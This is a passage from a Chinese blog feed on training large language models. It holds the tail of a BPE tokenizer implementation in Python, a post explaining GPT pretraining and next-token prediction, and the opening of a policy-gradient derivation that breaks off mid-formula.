defaultdict<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>split <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>merges <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>initialize<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>vocab <span class="token operator">=</span> self<span class="token punctuation">.</span>alphabet<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">initialize</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> words <span class="token keyword">in</span> self<span class="token punctuation">.</span>corpus<span class="token punctuation">:</span>            <span class="token keyword">for</span> word <span class="token keyword">in</span> words<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>word_freqs<span class="token punctuation">[</span>word<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>                self<span class="token punctuation">.</span>alphabet<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>split <span class="token operator">=</span> <span class="token punctuation">&#123;</span>word<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token string">'&lt;/w>'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> word <span class="token keyword">in</span> self<span class="token punctuation">.</span>word_freqs<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    <span class="token keyword">def</span> <span class="token function">print_split</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        max_len <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span> <span class="token keyword">for</span> word <span class="token keyword">in</span> self<span class="token punctuation">.</span>split<span class="token punctuation">)</span>        <span class="token keyword">for</span> word<span class="token punctuation">,</span> s <span class="token keyword">in</span> self<span class="token punctuation">.</span>split<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            padding <span class="token operator">=</span> <span class="token string">" "</span> <span class="token operator">*</span> <span class="token punctuation">(</span>max_len <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>word<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>padding<span class="token punctuation">&#125;</span></span><span class="token string"> → </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_stats</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        pairs <span class="token operator">=</span> defaultdict<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> word<span class="token punctuation">,</span> freq <span class="token keyword">in</span> self<span class="token punctuation">.</span>word_freqs<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            word_split <span class="token operator">=</span> self<span class="token punctuation">.</span>split<span class="token punctuation">[</span>word<span class="token punctuation">]</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>word_split<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                pairs<span class="token punctuation">[</span><span class="token punctuation">(</span>word_split<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> word_split<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+=</span> freq        <span class="token keyword">return</span> pairs    <span class="token keyword">def</span> <span class="token function">merge_pair</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> pair<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>merges<span class="token punctuation">[</span>pair<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>pair<span class="token punctuation">)</span>        <span class="token keyword">for</span> word <span class="token keyword">in</span> self<span class="token punctuation">.</span>word_freqs<span class="token punctuation">:</span>            split <span class="token operator">=</span> self<span class="token punctuation">.</span>split<span class="token punctuation">[</span>word<span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>split<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            idx <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">while</span> idx <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>split<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>split<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> split<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> pair<span class="token punctuation">:</span>                    split<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>pair<span class="token punctuation">)</span>                    <span class="token keyword">del</span> split<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    idx <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">def</span> <span class="token function">find_single_item</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> item<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> split <span class="token keyword">in</span> self<span class="token punctuation">.</span>split<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> split<span class="token punctuation">:</span>                <span class="token keyword">if</span> i <span class="token operator">==</span> item<span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">train</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>vocab<span class="token punctuation">)</span> <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>vocab_size<span class="token punctuation">:</span>            pairs <span class="token operator">=</span> self<span class="token punctuation">.</span>get_stats<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> pairs<span class="token punctuation">:</span>                <span class="token keyword">break</span>            sorted_pairs <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>pairs<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>            max_pair<span class="token punctuation">,</span> max_freq <span class="token operator">=</span> sorted_pairs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> max_freq <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            self<span class="token punctuation">.</span>merge_pair<span class="token punctuation">(</span>max_pair<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>vocab<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>max_pair<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> max_pair<span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>find_single_item<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>vocab<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Vocab size: "</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>vocab<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">'\r'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">tokenize</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>        pre_tokenized_text <span class="token operator">=</span> text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>        splits_text <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> word<span class="token punctuation">]</span> <span class="token keyword">for</span> word <span class="token keyword">in</span> pre_tokenized_text<span class="token punctuation">]</span>        <span class="token keyword">for</span> pair <span class="token keyword">in</span> self<span class="token punctuation">.</span>merges<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> split <span class="token keyword">in</span> splits_text<span class="token punctuation">:</span>                idx <span class="token operator">=</span> <span class="token number">0</span>                <span class="token keyword">while</span> idx <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>split<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>split<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> split<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> pair<span class="token punctuation">:</span>                        split<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>pair<span class="token punctuation">)</span>                        <span class="token keyword">del</span> split<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        idx <span class="token operator">+=</span> <span class="token number">1</span>        result <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>splits_text<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">export_vocab</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> vocab_path<span class="token operator">=</span><span class="token string">"vocab.json"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        vocab <span class="token operator">=</span> <span class="token punctuation">&#123;</span>token<span class="token punctuation">:</span> idx <span class="token keyword">for</span> idx<span class="token punctuation">,</span> token <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>vocab<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        <span class="token keyword">import</span> json        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>vocab_path<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>vocab<span class="token punctuation">,</span> f<span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Saved vocab to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>vocab_path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">export_merges</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> merges_path<span class="token operator">=</span><span class="token string">"merges.txt"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>merges_path<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"#version: 0.2\n"</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> pair <span class="token keyword">in</span> self<span class="token punctuation">.</span>merges<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Saved merges to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>merges_path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>bpe <span class="token operator">=</span> BPE<span class="token punctuation">(</span>corpus<span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span>bpe<span class="token punctuation">.</span>train<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>以上便是 BPE（Byte Pair Encoding）分词算法的核心思想、训练流程与示例代码。它以字符为起点，通过词频驱动的逐步合并，构建出稳定、高效、具有语义结构的子词单元，从而有效缓解了 OOV 问题并保证了模型的语义建模能力。</p><p>如今，随着自然语言处理技术的进一步发展，已经出现了许多更先进的分词技术，如基于概率的 Unigram 模型等，但 BPE 仍然是理解现代分词算法原理的良好起点。它结构清晰、逻辑直观，能够帮助我们把握子词构建、词表学习与编码压缩等核心思想，为进一步理解更复杂的分词方法打下基础。</p><p>有了分词器，我们便能将原始的自然语言文本转化为模型可以处理的 token 序列，搭建起语言与模型之间的桥梁。在此基础上，模型在大规模语料上进行预训练才成为可能。但这一步，只是让模型学会“怎么说话”。</p><p>经过了充分预训练的语言模型，只是一个“话痨”——它能接得住任何话题（擅长续写），却不一定听得懂你的意思。要让它从“能说”变成“听话”，我们还需要通过<strong>监督微调（SFT）</strong>进一步训练，让模型学会听指令、做任务、少废话。</p><p>这就是大模型训练的第二块拼图——笔者将在<a href="/blog/12690/">下一篇文章</a>中进行讨论。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;a href=&quot;/blog/12634/&quot;&gt;上一篇文章&lt;/a&gt;中，我们已经了解了大语言模型通过在海量自然语言语料上学习&lt;strong&gt;预测下一个</summary>
        
      
    
    
    
    <category term="学习笔记" scheme="https://blog.fyz666.xyz/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="大语言模型训练" scheme="https://blog.fyz666.xyz/categories/%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83/"/>
    
    
    <category term="机器学习" scheme="https://blog.fyz666.xyz/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="深度学习" scheme="https://blog.fyz666.xyz/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="LLM" scheme="https://blog.fyz666.xyz/tags/llm/"/>
    
    <category term="BPE 算法" scheme="https://blog.fyz666.xyz/tags/bpe-%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>大语言模型训练原理与实践（零）：预训练</title>
    <link href="https://blog.fyz666.xyz/blog/12634/"/>
    <id>https://blog.fyz666.xyz/blog/12634/</id>
    <published>2025-06-21T16:12:59.000Z</published>
    <updated>2025-08-14T08:53:41.568Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言（吐槽）"><a href="#前言（吐槽）" class="headerlink" title="前言（吐槽）"></a>前言（吐槽）</h2><p>自从大语言模型横空出世，各行业的从业者都仿佛开了挂似的，科研、工作效率那是咔咔上涨，唯独我这个正儿八经的AI在读博士生，现在却感觉自己成了个小丑🤡：眼睁睁看着LLM在世界舞台上风生水起，自己训练的人工智能模型一个个都跟人工智障似的，别说去现实环境投入使用了，连外行审稿人都忽悠不过去；至于这💩上雕花的缝合怪科研，也是<del>憋不出个屁</del>黔驴技穷了。最绝望的是，当我试图投身LLM的怀抱时，不好意思，显存都不够训练个demo。</p><p><img src="https://blogfiles.oss.fyz666.xyz/webp/42472fd9-eb4c-438d-adf8-c049528555b5.webp" alt="" style="zoom: 20%;" /></p><p>在有点腻了这种闭门造车的行为以后，吐槽归吐槽，作为一个实干型的炼丹师，光把大模型用于应用、推理是远远不够的，还得弄明白它的训练原理。毕竟，只有了解了这些，才不至于在调参和部署中沦为“黑箱”工具的操作者，也意味着能更有针对性地优化数据处理流程、设计更有效的模型结构。换句话说，搞清楚训练原理，是从“用大模型”到“造大模型”的分水岭。</p><p>既然如此，接下来就该跳出“只会用API”的舒适区，真正去了解一下大模型训练过程中的三块核心拼图：预训练、SFT、RLHF 。</p><p>在开始之前，先叠几层甲：</p><div class="note primary simple"><p>由于笔者没有充足的算力去支持具有实用价值的大模型的训练、微调工作，本系列文章只是尽我所理解写了点最基本的大模型训练方法和逻辑，不包含任何的训练trick——这些训练技巧往往依赖大量实践经验和工程调优，在没有真实大规模实验条件的情况下难以深入探讨。</p></div><div class="note primary simple"><p>本系列文章仅讨论最传统的大模型训练流程，不涉及各种新兴的技术分支，对于更前沿或更复杂的训练范式，往往需要丰富的工程实践经验和大量实验积累才能真正掌握，故在此不作展开。</p></div><p>本文就先从大模型训练的第一步开始：预训练。</p><hr><h2 id="Transformer-amp-GPT"><a href="#Transformer-amp-GPT" class="headerlink" title="Transformer &amp; GPT"></a>Transformer &amp; GPT</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>大语言模型的基本组成模块，是2017年于论文<a href="https://arxiv.org/abs/1706.03762">Attention is All You Need</a>中提出的模型：<strong>Transformer</strong>。这里插句题外话：虽然我的研究方向和大模型是一毛钱关系没有，但我所使用的模型结构也包含了Transformer模块，而且我还在五年前<a href="https://github.com/windshadow233/HandWritten-Transformer-NMT">手搓过一个Transformer</a>，故对这个玩意我是再熟悉不过了。</p><p><img src="https://blogfiles.oss.fyz666.xyz/webp/88480c83-1c3a-43a0-b39b-d2b6273ae0ec.webp" alt="" style="zoom:50%;" /></p><p>因此，关于 Transformer 的基本结构我不再赘述。这里默认读者已经具备一定的相关基础，或者至少了解 Transformer 核心组件如嵌入层（Embedding）、自注意力（Self-Attention）、多头注意力（Multi-Head Attention）与前馈网络（Feed-Forward Network）。</p><p>简而言之，Transformer做了一件事：使用全局注意力机制替代了传统的 RNN，实现了并行化的序列建模。而它所能达到的效果其实非常简单，仅仅是将序列整体往后预测了一个时间步：</p><p><img src="https://blogfiles.oss.fyz666.xyz/webp/b1821456-6c1c-44eb-825c-8224909e1b4a.webp" alt="" style="zoom: 33%;" /></p><p>而对Transformer模型进行训练的过程，其实也如出一辙：对一个<code>input</code>序列计算得到<code>predict</code>序列，然后将<code>predict</code>序列与真实的<code>target</code>序列进行一个Cross Entropy的计算，例如上图的例子，如果<code>predict</code>得到：<code>cat is lying on the chair</code>，则会在最后一个词上产生一个较大的分类loss。这种建模方式称为<strong>自回归建模</strong>。</p><p>以上，就是Transformer最基本的训练方法。当然，训练形式也有多种改版，例如曾经名噪一时的BERT模型，是通过随机挖去句子中的某些token，让模型对这些挖掉的token进行预测的方式来训练（做完形填空是吧？），这种建模方式则称为<strong>掩码建模</strong>。</p><h3 id="GPT"><a href="#GPT" class="headerlink" title="GPT"></a>GPT</h3><p>GPT（Generative Pretrained Transformer）则是一种典型的自回归语言模型，它的基本组件正是前面介绍的Transformer——不过在设计上有一些简化与调整：</p><ul><li>去掉了Encoder层，只保留了Decoder层。</li><li>在训练时引入了因果掩码，这是由于自回归语言模型的任务是<strong>预测下一个token</strong>，确保模型在每个位置只能访问当前位置token及之前的token，否则无异于标签泄露。</li></ul><p><img src="https://blogfiles.oss.fyz666.xyz/webp/75327ffd-583e-4c74-8a09-e645d150bd92.webp" alt="Matplotlib Chart" style="zoom:30%;" /></p><p>整个GPT模型则是由一堆这样的Transformer Decoder模块层层堆叠而成，通过深层堆叠来增强模型的记忆、理解与生成能力。</p><p>GPT模型的最后输出层，与前面提到的Transformer相同，同样是一个<strong>全连接线性层</strong>，用于将每个位置的隐藏状态映射到等同于词表大小的 logits 上，然后再通过 <strong>softmax</strong> 得到每个 token 的预测概率分布。同样的，这个概率分布既可用于计算Cross Entropy，又可用于在推理过程中计算下一个token。</p><h2 id="GPT模型的预训练"><a href="#GPT模型的预训练" class="headerlink" title="GPT模型的预训练"></a>GPT模型的预训练</h2><p>随机初始化一个GPT模型的权重，我们得到了一个只会<del>阿巴阿巴</del>输出乱码的人工智障，它完全不懂人类的语言。为了让这个模型逐渐“开窍”，像鹦鹉学舌一样模仿人类说话，我们首先需要让它接受足够多的人类语言文本，从中学习到语言的基本结构、规律等。</p><p>这个过程，就是大语言模型训练的第一步：预训练。</p><p>那么，预训练到底在让模型学些什么？其实这个任务非常简单，正如前文提到的，模型只不过在不停地学习如何<strong>预测下一个token</strong>。</p><p>在看似简单的任务中，模型能学到的远比你感觉到的多：</p><p>除了基本的句法结构以外，它还需要掌握词与词之间的搭配规律（比如“大海捞针”比“海底捞针”更符合语言习惯，即使它们的语法都是对的）；理解上下文的逻辑关系，判断当前句子下一个最合理的词是什么。在很多时候，它还需要学会一些知识——比如在输入句子：「全民制作人们大家好，我是练习时长」时，模型若想答对，就得知道接下来三个字是“两年半”。</p><p><img src="https://blogfiles.oss.fyz666.xyz/webp/e935f31b-f62d-4c91-9e37-b5f13d1ee399.webp" alt="images"></p><p>那么模型从哪里能学到这些东西？</p><h2 id="数据来源-amp-处理"><a href="#数据来源-amp-处理" class="headerlink" title="数据来源 &amp; 处理"></a>数据来源 &amp; 处理</h2><p>互联网时代最不缺的就是自然语言语料数据，只要愿意抓取，网页、论坛、百科、书籍、社交媒体、问答网站等等，文本信息可不要太多，而且对于这样一个<strong>预测下一个token</strong>的任务而言，这些语料数据天然自带标签，也就是说，只要把海量文本收集起来，模型就能开始进行预训练。但在此之前，仍需要对数据进行一定的预处理，包括但不限定于以下：</p><ul><li><strong>清洗无关内容</strong>：例如去除网页文本中夹带的 HTML 标签，过滤掉乱码等明显非自然语言内容。</li><li><strong>优先采用高质量语料库</strong>：例如使用语言结构清晰、表达规范的维基百科等公开书面语料，这些内容能帮助模型学习到标准的句法结构和书面表达习惯。甚至还可以用传统方法训练一个分类器对文本质量进行打分，从而筛选高质量的语料。</li></ul><hr><p>以上，便是 GPT 模型预训练阶段的基本流程与核心逻辑。从<strong>预测下一个 token</strong>这一任务出发进行预训练，模型能够逐步建立起对语言的初步理解能力。这一阶段虽然看似简单，却是大语言模型能力构建的根基。</p><p>不过在前文中，我们略过了一个关键细节：出现了好多次的所谓 “token”，到底是什么？</p><p>在本文的例子中，它被简单描述为了某个词，但在工程上，它并不是简单的字、词，甚至有时只是一部分词。为了让模型既能处理常见词，也能灵活应对生僻词与多语言输入，我们必须对文本进行一种合理的编码与切分。这便引出了 BPE（Byte Pair Encoding）算法：一种高效的子词级编码方案，也是 GPT 等主流大模型采用的分词策略。</p><p>笔者将在<a href="/blog/12679/">下一篇文章</a>中简单介绍 BPE 的原理与实现，看看 GPT 是如何将原始文本处理成模型输入层能够接受的 token 序列。</p>]]></content>
    
    
    <summary type="html">从头训练一个小型大语言模型</summary>
    
    
    
    <category term="学习笔记" scheme="https://blog.fyz666.xyz/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="大语言模型训练" scheme="https://blog.fyz666.xyz/categories/%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83/"/>
    
    
    <category term="机器学习" scheme="https://blog.fyz666.xyz/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="深度学习" scheme="https://blog.fyz666.xyz/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="LLM" scheme="https://blog.fyz666.xyz/tags/llm/"/>
    
  </entry>
  
  <entry>
    <title>策略梯度算法中梯度公式的推导</title>
    <link href="https://blog.fyz666.xyz/blog/12633/"/>
    <id>https://blog.fyz666.xyz/blog/12633/</id>
    <published>2025-06-09T02:04:20.000Z</published>
    <updated>2025-08-14T08:53:41.568Z</updated>
    
    <content type="html"><![CDATA[<p>最近学习强化学习的策略梯度算法时，遇到其中策略梯度的计算部分，一些推导的细节在我所学习的视频中被一句话带过了，而这些推导过程本该十分重要，故在本文中简单整理一下。</p><p>首先表述几个基本的符号：</p><ul><li><script type="math/tex">S</script> 是全体状态的集合，<script type="math/tex">A</script> 是全体动作的集合。</li><li><script type="math/tex">\pi_\theta(*\mid s_t)</script> 表示以 <script type="math/tex">\theta</script> 为参数、在 <script type="math/tex">t</script> 时间步的状态 <script type="math/tex">s_t</script> 下的动作策略，是一个概率分布。<script type="math/tex">\theta</script> 即是本算法优化的参数。</li><li><script type="math/tex">R_t</script> 表示时间步 <script type="math/tex">t</script> 的即时奖励。</li><li><script type="math/tex">U_t=\sum_{i=t}^n\gamma^{i-t}R_i</script> 表示从时间步 <script type="math/tex">t</script> 开始的累计回报。</li><li><script type="math/tex">Q(s_t,a_t)=\mathbb{E}[U_t\mid s=s_t,a=a_t]</script> 表示在状态 <script type="math/tex">s_t</script> 时采取动作 <script type="math/tex">a_t</script> 时能获得的累计回报 <script type="math/tex">U_t</script> 的期望值。</li><li><script type="math/tex">V_{\pi_\theta}(s_t)=\mathbb{E}_{a_t\sim\pi_\theta(*\mid s_t)}[Q(s_t,a_t)]</script> 表示在状态 <script type="math/tex">s_t</script> 下，使用动作策略 <script type="math/tex">\pi_\theta</script> 时，<script type="math/tex">Q</script> 函数的期望值。</li><li><script type="math/tex">J(\theta)=\mathbb{E}_{s\in S}[V_{\pi_\theta}(s)]</script> 表示采取 以<script type="math/tex">\theta</script> 为参数的动作策略 <script type="math/tex">\pi_\theta</script> 时，能获得的所有状态下的回报的期望值。</li></ul><p>考虑到希望在策略 <script type="math/tex">\pi_\theta</script> 下获得尽可能高的回报，我们的优化目标自然是：</p><script type="math/tex; mode=display">\max_{\theta\in\Theta}J(\theta)</script><p>故需要计算 <script type="math/tex">\nabla_\theta J(\theta)</script>，计算此梯度时运用了一个称为「Log Derivative Trick」的技巧，下面推导一下这个梯度：</p><script type="math/tex; mode=display">\begin{aligned}\nabla_\theta J(\theta)&=\nabla_\theta\mathbb{E}_{s\in S}[V_{\pi_\theta}(s)]\\&=\nabla_\theta\mathbb{E}_{s\in S}\mathbb{E}_{a_t\sim\pi_\theta(*\mid 